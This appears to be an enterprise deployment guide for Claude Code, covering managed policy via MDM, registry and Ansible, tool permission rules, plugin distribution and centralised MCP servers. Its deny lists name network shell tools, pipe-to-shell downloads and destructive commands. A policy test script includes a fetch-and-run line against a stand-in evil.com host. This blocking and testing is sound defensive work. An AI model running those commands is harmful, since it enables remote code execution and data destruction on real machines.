---
title: Enterprise Deployment Guide
description: >
  Complete Claude Code enterprise deployment reference — managed settings via MDM/registry/plist,
  policy federation for 500+ developer organisations, shared MCP server infrastructure,
  audit logging with OpenTelemetry, cost governance and budget caps, team CLAUDE.md distribution
  via plugins, multi-cloud auth (Bedrock service tiers, Vertex WIF), security hardening,
  enterprise hooks for compliance, and organisational rollout playbook. v2.1.126 (May 2026).
sidebar:
  order: 26
lastUpdated: 2026-06-07
---

# Enterprise Deployment Guide

> **Version:** v2.1.126 (May 30, 2026) · Targets platform teams, AI Ops leads, and CISOs deploying Claude Code to 50–5,000+ developers.

---

## 1. Introduction

### What "Enterprise Claude Code" Means

Claude Code is individually powerful out of the box, but deploying it to hundreds or thousands of developers introduces a distinct set of operational concerns that individual use never surfaces: cost attribution, compliance evidence, model governance, security policy enforcement, and consistent developer experience across teams.

Enterprise features in Claude Code address these concerns through four mechanisms:

1. **Managed settings** — organisation-wide policy that users cannot override, delivered via MDM, Group Policy, or system-level JSON files
2. **Centralized infrastructure** — shared MCP servers, shared CLAUDE.md plugins, shared hooks library
3. **Observability** — full OpenTelemetry instrumentation of every tool call, session event, and cost unit
4. **Multi-cloud auth** — AWS Bedrock and GCP Vertex AI integration, including IAM-native auth with no long-lived API keys

### Who This Guide Is For

| Role | What you'll use |
|------|----------------|
| **Platform / DevEx teams** | Managed settings deployment, plugin distribution, MCP server infrastructure |
| **Security / CISO** | Compliance hooks, secret scanning, audit logging, RBAC for tools |
| **AI Ops / FinOps** | Cost governance, budget caps, OTEL dashboards, per-team allocation |
| **CTO / Engineering leadership** | Rollout playbook, success metrics, cloud provider strategy |

### What Changes at Enterprise Scale

Individual Claude Code use has two configuration layers: personal (`~/.claude/settings.json`) and project (`.claude/settings.json`). Enterprise adds two more:

```
ENTERPRISE SETTINGS (MDM / GPO / managed JSON)
    ↓ overrides everything below
USER SETTINGS (~/.claude/settings.json)
    ↓ overrides project below
PROJECT SETTINGS (.claude/settings.json)
    ↓ base layer
DEFAULTS (Claude Code built-ins)
```

The enterprise layer is **mandatory** — users cannot see, edit, or override it. This is the critical distinction from individual use.

---

## 2. Managed Settings Architecture

### What Managed Settings Do

Managed settings are read at process startup, before any user or project configuration is applied. They establish a hard floor that all other configuration sits on top of. If managed settings say `"model": "claude-sonnet-4-6"` and a user's `~/.claude/settings.json` says `"model": "claude-opus-4-7"`, Claude Code uses Sonnet. The enterprise setting wins without error or warning to the user.

### The Managed Settings File

The cross-platform path for managed settings is:

```
/etc/claude-code/managed-settings.json          # Linux
C:\ProgramData\Anthropic\ClaudeCode\managed-settings.json  # Windows
/Library/Application Support/ClaudeCode/managed-settings.json  # macOS (file-based)
```

You can override the path with the environment variable `CLAUDE_CODE_MANAGED_SETTINGS_PATH`:

```bash
export CLAUDE_CODE_MANAGED_SETTINGS_PATH=/opt/corp/claude/managed-settings.json
```

This is the preferred approach for Linux fleet management — set the env var in `/etc/environment` or your MDM's environment injection mechanism.

### Full Managed Settings Schema

```json
{
  "model": "claude-sonnet-4-6",
  "maxBudgetUsd": 5.00,
  "maxBudgetTokenCap": 500000,
  "maxEffortLevel": "high",
  "permissionMode": "default",
  "defaultPermissionMode": "default",
  "disableTelemetryOverride": true,
  "disableAutoUpdate": true,
  "disableUsageStats": false,
  "allowedModels": [
    "claude-sonnet-4-6",
    "claude-haiku-4-5"
  ],
  "permissions": {
    "allow": [
      "Read",
      "Write",
      "Edit",
      "MultiEdit",
      "Glob",
      "Grep",
      "Bash(git *)",
      "Bash(npm *)",
      "Bash(dotnet *)",
      "TodoRead",
      "TodoWrite",
      "WebFetch"
    ],
    "deny": [
      "Bash(rm -rf *)",
      "Bash(sudo *)",
      "Bash(curl * | bash)",
      "Bash(wget * -O - | sh)",
      "Bash(ssh *)",
      "Bash(scp *)",
      "Bash(nc *)",
      "Bash(ncat *)",
      "Bash(socat *)"
    ]
  },
  "otelEndpoint": "https://otel.internal.corp.com:4318",
  "otelServiceName": "claude-code",
  "otelResourceAttributes": {
    "deployment.environment": "production",
    "org.name": "acme-corp"
  },
  "mcpServers": {
    "corp-tools": {
      "url": "https://mcp.internal.corp.com/tools",
      "auth": "service-account"
    }
  }
}
```

Settings that appear in managed config **cannot be overridden** by user or project settings. Settings absent from managed config can be freely set by users within those layers.

### macOS MDM via Managed Preferences (Jamf / Mosyle / Kandji)

On macOS with an MDM provider, deploy as a configuration profile using the `com.anthropic.claudecode` preference domain. Create a `.mobileconfig` payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>PayloadContent</key>
  <array>
    <dict>
      <key>PayloadType</key>
      <string>com.anthropic.claudecode</string>
      <key>PayloadVersion</key>
      <integer>1</integer>
      <key>PayloadIdentifier</key>
      <string>com.corp.mdm.claudecode.policy</string>
      <key>PayloadUUID</key>
      <string>A1B2C3D4-E5F6-7890-ABCD-EF1234567890</string>
      <key>PayloadDisplayName</key>
      <string>Claude Code Enterprise Policy</string>
      <!-- Policy keys below are merged into managed-settings.json -->
      <key>model</key>
      <string>claude-sonnet-4-6</string>
      <key>disableAutoUpdate</key>
      <true/>
      <key>disableTelemetryOverride</key>
      <true/>
      <key>maxBudgetUsd</key>
      <real>5.0</real>
      <key>otelEndpoint</key>
      <string>https://otel.internal.corp.com:4318</string>
    </dict>
  </array>
  <key>PayloadDescription</key>
  <string>Manages Claude Code enterprise policy settings</string>
  <key>PayloadDisplayName</key>
  <string>Claude Code Policy</string>
  <key>PayloadIdentifier</key>
  <string>com.corp.mdm.claudecode</string>
  <key>PayloadOrganization</key>
  <string>Acme Corp</string>
  <key>PayloadRemovalDisallowed</key>
  <true/>
  <key>PayloadType</key>
  <string>Configuration</string>
  <key>PayloadUUID</key>
  <string>B2C3D4E5-F6A7-8901-BCDE-F12345678901</string>
  <key>PayloadVersion</key>
  <integer>1</integer>
</plist>
```

Claude Code reads managed preferences from `/Library/Managed Preferences/com.anthropic.claudecode.plist`, which is where macOS MDM writes profile payloads. Claude Code merges this with the file-based managed settings — plist values take precedence over the JSON file if both are present.

**How macOS MDM delivery works end-to-end:**

When the MDM server (Jamf, Mosyle, or Kandji) pushes the `.mobileconfig` profile to a device, the following sequence occurs:

1. The MDM agent on the device receives the profile payload from the MDM server over APNS (Apple Push Notification Service)
2. macOS writes the preference domain values into `/Library/Managed Preferences/com.anthropic.claudecode.plist` — this file is owned by root and is not writable by the user
3. The next time Claude Code launches, it calls `CFPreferencesCopyMultiple` on the `com.anthropic.claudecode` domain with the `kCFPreferencesAnyUser` / `kCFPreferencesCurrentHost` scope, which reads from `/Library/Managed Preferences/` before any user-writable location
4. Values read from managed preferences are merged with the JSON file; plist wins on conflict
5. The user cannot override managed preference values — any attempt to write to the same preference key from userspace is silently ignored by macOS

**Verifying that settings were applied on a developer's Mac:**

```bash
# Confirm the plist exists and contains the expected values
sudo defaults read /Library/Managed\ Preferences/com.anthropic.claudecode

# Or use PlistBuddy to check a specific key
sudo /usr/libexec/PlistBuddy -c "Print :model" \
  /Library/Managed\ Preferences/com.anthropic.claudecode.plist

# From claude itself — shows the effective resolved value
claude config get model
```

If `claude config get model` returns the managed value, the profile is being applied correctly. If it returns a user-set value instead, the profile delivery may have failed — check MDM logs on the server and run `sudo profiles show -type configuration` on the device to see which profiles are installed.

**Deploy via Jamf:**
1. Profiles → Computer Profiles → + New
2. General → payload type: Custom
3. Upload the `.mobileconfig` file
4. Scope to your Claude Code user group

### Windows GPO and MDM via Registry

Claude Code reads enterprise settings from the registry key:

```
HKLM\SOFTWARE\Anthropic\ClaudeCode\Policy
```

For user-scoped MDM (Intune), settings can also be pushed to:

```
HKCU\SOFTWARE\Policies\Anthropic\ClaudeCode
```

`HKLM` (machine-wide) takes precedence over `HKCU` (user-scoped).

**Registry value types and keys:**

| Value Name | Registry Type | Example |
|------------|--------------|---------|
| `Model` | REG_SZ | `claude-sonnet-4-6` |
| `MaxBudgetUsd` | REG_DWORD | `500` (cents — divide by 100) |
| `DisableAutoUpdate` | REG_DWORD | `1` (true) or `0` (false) |
| `DisableTelemetryOverride` | REG_DWORD | `1` |
| `OtelEndpoint` | REG_SZ | `https://otel.internal.corp.com:4318` |
| `AllowedModels` | REG_MULTI_SZ | newline-separated model IDs |
| `MaxEffortLevel` | REG_SZ | `high` |

**How Windows registry-based policy delivery works end-to-end:**

When Intune or Group Policy pushes a policy to a Windows device, the sequence is:

1. **Intune path:** The Intune Management Extension (IME) runs as SYSTEM and writes values to `HKLM\SOFTWARE\Anthropic\ClaudeCode\Policy` via the OMA-URI configuration profile, or executes a PowerShell remediation script that sets the keys
2. **GPO path:** On domain-joined machines, `gpupdate /force` (or the background policy refresh cycle, every 90 minutes by default) causes the Group Policy client to read the ADMX-defined settings and write them to `HKLM\SOFTWARE\Policies\Anthropic\ClaudeCode`
3. When Claude Code starts, it calls `RegOpenKeyEx` on `HKLM\SOFTWARE\Anthropic\ClaudeCode\Policy` (machine-wide, Intune) and `HKLM\SOFTWARE\Policies\Anthropic\ClaudeCode` (GPO). If both exist, GPO wins on conflict
4. `HKCU` (user-scoped) values are read only if `HKLM` values are absent — user-scope settings cannot override machine-scope policy
5. Users without administrator rights cannot write to `HKLM` keys, so managed policy values are immutable from userspace

**Verifying registry policy on a developer's Windows machine:**

```powershell
# Check what managed values are present
Get-ItemProperty -Path "HKLM:\SOFTWARE\Anthropic\ClaudeCode\Policy"

# Confirm a specific value
(Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Anthropic\ClaudeCode\Policy" `
  -Name "Model") -eq "claude-sonnet-4-6"

# Check GPO-delivered values (if using ADMX/GPO)
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Anthropic\ClaudeCode"

# From claude itself (run as the target user, not as SYSTEM)
claude config get model
```

If the registry key exists but `claude config get model` returns a different value, check whether a `~/.claude/settings.json` value is somehow overriding it — which should not be possible if the registry key is read correctly. Check the Windows Event Log under Applications and Services → Claude Code for startup errors.

**Deploy via Intune (Windows MDM):**

1. Devices → Configuration → Create Policy → Windows 10/11 → Settings Catalog
2. Search for "Custom OMA-URI"
3. Add URI: `./Device/Vendor/MSFT/Policy/Config/ADMX_ClaudeCode/Model`
4. Data type: String, Value: `claude-sonnet-4-6`

Or deploy via Group Policy using an ADMX template. Anthropic provides an ADMX file at `https://downloads.anthropic.com/claude-code/admx/ClaudeCode.admx`.

**PowerShell deployment script:**

```powershell
# enterprise-claude-policy.ps1 — run as SYSTEM via Intune or SCCM
$policyRoot = "HKLM:\SOFTWARE\Anthropic\ClaudeCode\Policy"

if (-not (Test-Path $policyRoot)) {
    New-Item -Path $policyRoot -Force | Out-Null
}

Set-ItemProperty -Path $policyRoot -Name "Model"                    -Value "claude-sonnet-4-6"
Set-ItemProperty -Path $policyRoot -Name "MaxBudgetUsd"             -Value 500 -Type DWord  # $5.00
Set-ItemProperty -Path $policyRoot -Name "DisableAutoUpdate"        -Value 1   -Type DWord
Set-ItemProperty -Path $policyRoot -Name "DisableTelemetryOverride" -Value 1   -Type DWord
Set-ItemProperty -Path $policyRoot -Name "MaxEffortLevel"           -Value "high"
Set-ItemProperty -Path $policyRoot -Name "OtelEndpoint"             -Value "https://otel.internal.corp.com:4318"

Write-Output "Claude Code enterprise policy applied."
```

### Linux Fleet Management

For Linux, use the `CLAUDE_CODE_MANAGED_SETTINGS_PATH` environment variable in `/etc/environment`:

```bash
# /etc/environment — applies to all login sessions
CLAUDE_CODE_MANAGED_SETTINGS_PATH=/etc/claude-code/managed-settings.json
```

Distribute `/etc/claude-code/managed-settings.json` via Ansible, Chef, Puppet, or your preferred configuration management tool.

**Ansible task:**

```yaml
# roles/claude-code-policy/tasks/main.yml
- name: Create Claude Code policy directory
  file:
    path: /etc/claude-code
    state: directory
    mode: '0755'
    owner: root
    group: root

- name: Deploy managed settings
  template:
    src: managed-settings.json.j2
    dest: /etc/claude-code/managed-settings.json
    mode: '0644'
    owner: root
    group: root
  notify: reload_claude_policy

- name: Set CLAUDE_CODE_MANAGED_SETTINGS_PATH in /etc/environment
  lineinfile:
    path: /etc/environment
    line: 'CLAUDE_CODE_MANAGED_SETTINGS_PATH=/etc/claude-code/managed-settings.json'
    state: present
```

### How Managed Settings Are Read at Runtime

Understanding the exact read sequence helps you diagnose configuration issues and understand precedence. When Claude Code starts, it loads settings in this order:

1. **Managed settings** — read first, before any user or project config. On macOS, this calls `CFPreferencesCopyMultiple` against the `com.anthropic.claudecode` domain with the `kCFPreferencesAnyUser/kCFPreferencesCurrentHost` scope, then overlays the JSON file at the path specified by `CLAUDE_CODE_MANAGED_SETTINGS_PATH`. On Windows, it reads `HKLM\SOFTWARE\Anthropic\ClaudeCode\Policy` (Intune) then `HKLM\SOFTWARE\Policies\Anthropic\ClaudeCode` (GPO). On Linux, it reads the JSON file directly.
2. **User settings** — `~/.claude/settings.json`. Any key that already has a managed value is silently ignored; the managed value wins without error.
3. **Project settings** — `.claude/settings.json` in the current working directory. Same override logic applies.
4. **CLI flags** — flags like `--model` or `--max-budget-usd` can override user/project settings but cannot override managed settings.

The result of this merge is the **effective configuration**. You can inspect it at any time with:

```bash
claude config list --all         # Shows all keys with their source (managed / user / project / default)
claude config get model          # Shows the effective value for a specific key
claude config get maxBudgetUsd   # Confirm the cap is enforced
```

If `claude config list` shows a key as `[managed]` in its source column, it cannot be changed by the user via `claude config set`.

### MDM Profile Delivery — End-to-End Troubleshooting

The most common enterprise deployment issue is a managed settings value that appears to be set in the MDM console but does not take effect on developer machines. This is almost always a profile delivery problem, not a Claude Code bug. Follow this diagnostic flow:

**macOS Jamf/Mosyle/Kandji:**

```bash
# Step 1: Verify the profile is installed on the device
sudo profiles show -type configuration | grep -A5 "ClaudeCode"
# Expected output: PayloadIdentifier = com.corp.mdm.claudecode

# Step 2: Verify the plist was written by MDM
sudo defaults read /Library/Managed\ Preferences/com.anthropic.claudecode
# Expected: all keys from your mobileconfig PayloadContent dict

# Step 3: Check for MDM delivery errors in system log
log show --last 1h --predicate 'process == "mdmclient"' | grep -i "anthropic\|claudecode"

# Step 4: Force a profile refresh without waiting for the MDM push cycle
sudo profiles renew -type enrollment

# Step 5: Confirm the effective value in Claude Code itself
claude config get model
```

If step 2 fails (plist doesn't exist), the MDM server didn't successfully deliver the profile. Check the MDM server enrollment status for that device. If step 2 succeeds but step 5 shows the wrong value, check whether a `~/.claude/settings.json` entry is incorrectly taking precedence — this would indicate a Claude Code bug (file a ticket with `claude diagnostics` output).

**Windows Intune/GPO:**

```powershell
# Step 1: Check whether Intune has synced policy to the device
Get-WinEvent -LogName "Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider/Admin" `
  | Where-Object { $_.Message -like "*Anthropic*" } | Select-Object -First 10

# Step 2: Force a policy sync
Start-Process -FilePath "cmd.exe" -ArgumentList "/c gpupdate /force" -Wait

# Step 3: Confirm registry key existence and value
$key = "HKLM:\SOFTWARE\Anthropic\ClaudeCode\Policy"
if (Test-Path $key) {
    Get-ItemProperty -Path $key
} else {
    Write-Warning "Policy key does not exist — Intune deployment may have failed"
}

# Step 4: Run resultant set of policy to confirm GPO application
gpresult /h C:\Temp\gpo-report.html /f
Start-Process C:\Temp\gpo-report.html  # Opens in browser — look for ClaudeCode entries

# Step 5: Confirm effective value
claude config get model
```

**Linux Ansible/Chef:**

```bash
# Step 1: Verify the managed-settings.json file exists and has correct permissions
ls -la /etc/claude-code/managed-settings.json
# Expected: -rw-r--r-- 1 root root

# Step 2: Validate JSON syntax
python3 -m json.tool /etc/claude-code/managed-settings.json > /dev/null
# Zero output = valid JSON; any output = syntax error (fix it)

# Step 3: Verify the env var is set in the login session
sudo -u "$TARGET_USER" env | grep CLAUDE_CODE_MANAGED
# Expected: CLAUDE_CODE_MANAGED_SETTINGS_PATH=/etc/claude-code/managed-settings.json

# Step 4: Confirm effective value
sudo -u "$TARGET_USER" claude config get model
```

A common Linux gotcha: `/etc/environment` is only read by PAM-based login sessions (SSH, desktop login). It is NOT read by sudo or by cron jobs. For non-login contexts (CI runners, Docker containers), set the env var explicitly in the container environment or the CI job definition.

### Lockable vs. User-Overridable Settings

| Setting | Managed (locked) | User-overridable |
|---------|-----------------|-----------------|
| `model` | Yes — prevents expensive model use | Yes — if not in managed |
| `allowedModels` | Yes — whitelist | Not applicable |
| `maxBudgetUsd` | Yes — hard ceiling | User can set *lower* |
| `maxEffortLevel` | Yes — caps effort tier | User can use lower |
| `permissions.deny` | Yes — org-wide deny rules | User can add more denies |
| `permissions.allow` | Yes — base allowlist | User can add more allows |
| `disableAutoUpdate` | Yes — freeze version | No |
| `disableTelemetryOverride` | Yes — prevent DISABLE_TELEMETRY | No |
| `otelEndpoint` | Yes — force corporate OTEL | No |
| `defaultPermissionMode` | Yes — floor mode | User can set stricter |
| `mcpServers` (managed servers) | Yes — added automatically | User adds their own on top |

The principle: managed settings establish **minimums and maximums**. Users can be more restrictive (lower budget, stricter permissions) but not less.

---

## 3. Tool Allowlist & Blocklist Policy

### Settings File Permissions Blocks

Allowlists and blocklists live in the `permissions` block of `settings.json` at either project level (`.claude/settings.json`) or user level (`~/.claude/settings.json`), and in managed settings for org-wide enforcement.

```json
{
  "permissions": {
    "allow": ["ToolName(pattern)", ...],
    "deny":  ["ToolName(pattern)", ...]
  }
}
```

**Evaluation order:** `deny` always beats `allow`. Enterprise managed `deny` beats project `deny`. If a tool matches both a managed `deny` and a project `allow`, the `deny` wins.

### Wildcard Pattern Syntax

```
Pattern                        Matches
─────────────────────────────────────────────────────────────────────────
Bash(git *)                    git status, git log, git diff, git commit
Bash(git status)               git status only (exact match)
Bash(npm run *)                npm run test, npm run build, npm run lint
Bash(rm *)                     rm with any arguments
Bash(rm -rf *)                 rm -rf <anything> (more specific)
Bash(sudo *)                   any sudo invocation
Bash(curl *)                   any curl invocation
Read                           Read tool, any file path
Read(/home/*/projects/**)      Read only within user project dirs
Write(/tmp/**)                 Write only to /tmp/ subtree
mcp__github__*                 all GitHub MCP tools
mcp__github__get_*             only read (get_) GitHub MCP tools
mcp__internal_db__write_*      only write tools from internal_db server
WebFetch(https://docs.*)       WebFetch restricted to docs subdomain only
*                              all tools (use only with deny list)
```

### Global vs. Project-Level Strategy

The recommended layered strategy for enterprise:

```
LAYER 1 — Managed (org-wide, cannot override):
  deny: destructive operations, network exfiltration patterns, sudo

LAYER 2 — Team settings (~/.claude/settings.json via onboarding script):
  allow: team's standard toolset
  deny: additional team-specific restrictions

LAYER 3 — Project settings (.claude/settings.json in repo):
  allow: project-specific tools (e.g., specific MCP server tools)
  deny: project-specific restrictions (e.g., no prod DB writes)
```

### Example: Block Destructive Operations Org-Wide

Place in managed settings:

```json
{
  "permissions": {
    "deny": [
      "Bash(rm -rf *)",
      "Bash(rm -r *)",
      "Bash(find * -delete)",
      "Bash(find * -exec rm *)",
      "Bash(git push --force *)",
      "Bash(git push -f *)",
      "Bash(git reset --hard *)",
      "Bash(dd *)",
      "Bash(mkfs *)",
      "Bash(fdisk *)",
      "Bash(sudo *)",
      "Bash(su *)",
      "Bash(chmod 777 *)",
      "Bash(chown root *)",
      "Bash(curl * | bash)",
      "Bash(curl * | sh)",
      "Bash(wget * | bash)",
      "Bash(wget * | sh)",
      "Bash(pip install * --break-system-packages)",
      "Bash(npm install -g *)",
      "Bash(ssh *)",
      "Bash(scp *)",
      "Bash(rsync * root@*)",
      "Bash(nc -l *)",
      "Bash(ncat *)",
      "Bash(socat *)"
    ]
  }
}
```

### Testing Policies Before Deployment

Use the `--print` mode with `--permission-mode plan` to dry-run against a policy without executing:

```bash
# Test that a policy blocks what it should — exit code 2 means blocked
claude --print "Delete all .log files recursively" \
       --permission-mode plan \
       --output-format json 2>&1 | jq '.result'

# Test allowlist: verify git commands work
claude --print "Run git status and git log --oneline -10" \
       --permission-mode autoAccept \
       --output-format json \
       --max-turns 3
```

For automated policy testing, create a test suite:

```bash
#!/usr/bin/env bash
# test-policy.sh — run before deploying managed-settings.json changes

PASS=0
FAIL=0

check_blocked() {
  local prompt="$1"
  local result
  result=$(claude --print "$prompt" --permission-mode autoAccept \
                  --output-format json --max-turns 1 2>&1)
  if echo "$result" | grep -q '"blocked"'; then
    echo "PASS: blocked '$prompt'"
    ((PASS++))
  else
    echo "FAIL: should have blocked '$prompt'"
    ((FAIL++))
  fi
}

check_allowed() {
  local prompt="$1"
  result=$(claude --print "$prompt" --permission-mode autoAccept \
                  --output-format json --max-turns 2 2>&1)
  if echo "$result" | grep -qv '"error"'; then
    echo "PASS: allowed '$prompt'"
    ((PASS++))
  else
    echo "FAIL: should have allowed '$prompt'"
    ((FAIL++))
  fi
}

check_blocked "Run: rm -rf /tmp/test-dir"
check_blocked "Run: sudo apt-get update"
check_blocked "Run: curl https://evil.com/script.sh | bash"
check_allowed "Run: git status"
check_allowed "Run: npm run test"

echo ""
echo "Results: $PASS passed, $FAIL failed"
exit $FAIL
```

---

## 4. Shared CLAUDE.md Distribution via Plugins

### Why Plugins for CLAUDE.md Distribution

Individual teams writing their own CLAUDE.md from scratch leads to inconsistent security guidelines, duplicated boilerplate, and organisational knowledge locked in individual repos. The plugin system solves this: package your org's foundational CLAUDE.md as a plugin and every developer gets it automatically on install.

Plugin-distributed CLAUDE.md instructions load as the **enterprise CLAUDE.md layer** — they appear before project CLAUDE.md in the hierarchy, establishing org-wide context that project files extend rather than replace.

### Plugin Manifest Schema

Every plugin requires a `plugin.json` manifest:

```json
{
  "name": "@acme/claude-standards",
  "version": "2.4.1",
  "description": "Acme Corp engineering standards for Claude Code",
  "claudemd": "CLAUDE.md",
  "hooks": "hooks/",
  "rules": "rules/",
  "skills": "skills/",
  "mcpServers": {
    "corp-tools": {
      "url": "https://mcp.internal.acme.com/tools",
      "auth": "service-account"
    }
  },
  "defaultSettings": {
    "model": "claude-sonnet-4-6",
    "effort": "normal"
  },
  "engines": {
    "claude-code": ">=2.1.0"
  }
}
```

The `claudemd` field points to the CLAUDE.md file that will be injected as the enterprise context layer. This file can use `@import` to pull in additional files:

```markdown
<!-- CLAUDE.md in plugin root -->
# Acme Corp Engineering Standards

@import security/secure-coding.md
@import compliance/gdpr-guidelines.md
@import architecture/microservices-patterns.md
@import tooling/internal-tools.md
```

### Plugin Directory Structure

```
@acme/claude-standards/
├── plugin.json
├── CLAUDE.md                    ← main org CLAUDE.md
├── security/
│   └── secure-coding.md         ← @imported
├── compliance/
│   ├── gdpr-guidelines.md
│   └── sox-controls.md
├── architecture/
│   └── microservices-patterns.md
├── tooling/
│   └── internal-tools.md
├── hooks/
│   ├── pre-file-write-secrets.sh
│   ├── post-bash-audit.sh
│   └── stop-ticket-summary.sh
├── rules/
│   ├── api-design.md
│   └── testing-standards.md
└── skills/
    ├── create-jira-ticket/
    │   └── SKILL.md
    └── deploy-service/
        └── SKILL.md
```

### CLAUDE_PLUGIN_ROOT Deployment Options

**Option 1: Private npm registry (recommended for large orgs)**

```bash
# Configure developer machines to use private registry
npm config set @acme:registry https://npm.internal.acme.com

# Install plugin globally — all new sessions pick it up
npm install -g @acme/claude-standards

# Or install at user level for Claude Code
claude plugins install @acme/claude-standards
```

Deploy via onboarding script run on new machine provisioning:

```bash
#!/usr/bin/env bash
# onboard-claude-code.sh
set -euo pipefail

# Configure private registry
npm config set @acme:registry https://npm.internal.acme.com

# Install enterprise plugin
claude plugins install @acme/claude-standards@latest

# Install team plugin if applicable
TEAM_PLUGIN=$(detect_team_from_ldap)
if [ -n "$TEAM_PLUGIN" ]; then
  claude plugins install "@acme/claude-${TEAM_PLUGIN}"
fi

echo "Claude Code enterprise setup complete."
echo "Plugin version: $(claude plugins list | grep @acme/claude-standards)"
```

**Option 2: Git-based install (for regulated environments without npm)**

```bash
# Install directly from internal Git server
claude plugins install git+https://git.internal.acme.com/platform/claude-standards.git

# Pin to a specific release tag
claude plugins install git+https://git.internal.acme.com/platform/claude-standards.git#v2.4.1
```

**Option 3: Local filesystem (air-gapped environments)**

```bash
# Distribute plugin as tarball via software center
curl -sL https://software.internal.acme.com/claude-standards-2.4.1.tgz \
  | claude plugins install --from-tarball -
```

### Plugin Versioning and Update Management

For enterprise deployments, **never use floating latest**. Pin versions explicitly:

```bash
# Pin in managed settings (prevents user upgrades)
# managed-settings.json
{
  "plugins": {
    "@acme/claude-standards": {
      "version": "2.4.1",
      "locked": true
    }
  }
}
```

Version rollout strategy:

```
v2.4.0 → canary (5 platform team members)
       → if stable after 48h:
v2.4.0 → early adopters (50 volunteers)
       → if stable after 1 week:
v2.4.0 → general rollout (500+ engineers, staged by team)
```

Use semantic versioning with a clear changelog. Breaking changes (new deny rules, removed tools) are major version bumps with a migration guide.

### Example: Org-Wide Security Guidelines Plugin

```markdown
<!-- CLAUDE.md in @acme/claude-standards plugin -->
# Acme Corp Engineering Standards

## Security Requirements (Mandatory)

These guidelines are non-negotiable across all Acme engineering work.

### Secret Handling
- NEVER write secrets, API keys, passwords, or tokens directly in code
- NEVER commit files matching: *.env, *.pem, *_key, *secret*, *password*
- Use Vault for all secret access: `vault kv get secret/service/<service-name>`
- Environment variables for secrets must be injected via CI/CD, never hardcoded

### Authentication
- All services must implement OAuth 2.0 with Acme's internal IdP (Okta)
- Session tokens expire in 4 hours (hard limit from security policy SEC-004)
- MFA required for any admin operation

### Dependency Policy
- New npm dependencies require security review via the package review board
- Python packages must be whitelisted in `/etc/acme/approved-pypi-packages.txt`
- No direct use of packages with known CVEs rated 7.0+ (CVSS)

### Logging
- Never log PII (names, emails, phone numbers, SSNs, card numbers)
- Log format: structured JSON with fields: timestamp, level, service, trace_id, message
- Minimum log level in production: WARN (DEBUG only in dev/staging)

## Internal Tooling

Our MCP server provides:
- `corp_tools::jira_create_ticket` — create Jira tickets
- `corp_tools::vault_get_secret` — retrieve secrets from Vault
- `corp_tools::internal_api_call` — call internal services

See https://wiki.internal.acme.com/claude-code for full tool documentation.
```

---

## 5. Shared MCP Server Infrastructure

### Architecture: Centralised HTTP vs. Distributed stdio

Individual developers typically run MCP servers locally via stdio (subprocess). Enterprise deployments should centralise these on HTTP MCP servers:

```
INDIVIDUAL (stdio)                    ENTERPRISE (HTTP MCP)
──────────────────────                ──────────────────────────────────────
Developer laptop                      Central MCP server cluster
  └─ claude process                     └─ mcp-server-1 (active)
       └─ stdio → local mcp-server       └─ mcp-server-2 (active)
                                         └─ mcp-server-3 (standby)
                                                  │
                                          Load balancer (nginx / ALB)
                                                  │
                                    ┌─────────────┼─────────────┐
                                    │             │             │
                                  Vault       Internal       Jira
                                  API         DBs           API
```

**Benefits of centralised HTTP MCP:**

- One place to update tool schemas when internal APIs change
- Authentication handled at the server level — developers don't need credentials
- Centralised audit trail of all tool calls (not per-developer)
- Horizontal scaling for high-concurrency enterprise use
- Single point for rate limiting and quota enforcement

### HTTP MCP Server Configuration

Register centralised MCP servers in managed settings:

```json
{
  "mcpServers": {
    "corp-tools": {
      "type": "http",
      "url": "https://mcp.internal.acme.com/v1/mcp",
      "auth": {
        "type": "oauth2",
        "tokenEndpoint": "https://auth.internal.acme.com/oauth/token",
        "clientCredentials": {
          "clientIdEnvVar": "CLAUDE_CODE_MCP_CLIENT_ID",
          "clientSecretEnvVar": "CLAUDE_CODE_MCP_CLIENT_SECRET"
        }
      },
      "timeout": 30000,
      "retries": 3
    },
    "data-platform": {
      "type": "http",
      "url": "https://mcp-data.internal.acme.com/v1/mcp",
      "auth": {
        "type": "mtls",
        "certPath": "/etc/acme/certs/claude-code-client.pem",
        "keyPath": "/etc/acme/certs/claude-code-client-key.pem"
      }
    }
  }
}
```

The `CLAUDE_CODE_MCP_CLIENT_ID` and `CLAUDE_CODE_MCP_CLIENT_SECRET` are injected by the MDM or loaded from the system keychain — they are never stored in a config file on disk.

### Service Mesh Integration

For organisations running Istio, Linkerd, or similar:

```yaml
# kubernetes/mcp-server-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: claude-mcp-server
  namespace: platform-tools
spec:
  replicas: 3
  selector:
    matchLabels:
      app: claude-mcp-server
  template:
    metadata:
      annotations:
        sidecar.istio.io/inject: "true"
        prometheus.io/scrape: "true"
        prometheus.io/port: "9090"
      labels:
        app: claude-mcp-server
        version: "v2.1.4"
    spec:
      serviceAccountName: claude-mcp-server
      containers:
      - name: mcp-server
        image: registry.internal.acme.com/platform/claude-mcp-server:v2.1.4
        ports:
        - containerPort: 8080
          name: http
        - containerPort: 9090
          name: metrics
        env:
        - name: VAULT_ADDR
          value: "https://vault.internal.acme.com"
        - name: VAULT_ROLE
          value: "claude-mcp-server"
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 10
          periodSeconds: 30
        readinessProbe:
          httpGet:
            path: /ready
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 10
        resources:
          requests:
            memory: "256Mi"
            cpu: "250m"
          limits:
            memory: "512Mi"
            cpu: "500m"
---
apiVersion: v1
kind: Service
metadata:
  name: claude-mcp-server
  namespace: platform-tools
spec:
  selector:
    app: claude-mcp-server
  ports:
  - name: http
    port: 443
    targetPort: 8080
  type: ClusterIP
```

### Authentication Patterns

**OAuth 2.0 Client Credentials (recommended for service-to-service)**

```python
# mcp_server/auth.py
from functools import wraps
import jwt
import httpx

JWKS_URI = "https://auth.internal.acme.com/.well-known/jwks.json"

async def verify_claude_code_token(token: str) -> dict:
    """Verify that the request comes from an authorised Claude Code instance."""
    async with httpx.AsyncClient() as client:
        jwks = await client.get(JWKS_URI)

    key = jwt.algorithms.RSAAlgorithm.from_jwk(
        next(k for k in jwks.json()["keys"] if k["kid"] == jwt.get_unverified_header(token)["kid"])
    )

